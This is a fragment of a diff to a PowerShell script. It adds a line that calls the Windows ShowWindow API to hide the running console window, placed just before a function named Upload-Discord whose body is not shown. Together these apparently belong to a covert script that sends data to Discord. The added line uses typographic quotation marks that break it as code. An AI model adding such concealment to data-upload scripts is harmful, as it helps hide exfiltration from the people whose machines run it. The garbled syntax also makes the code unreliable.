@@ -1,3 +1,5 @@
+Add-Type -Name win -MemberDefinition ‘[DllImport(« user32.dll »)] public static extern bool ShowWindow(int handle, int state);’ -Namespace native [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle,0)
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
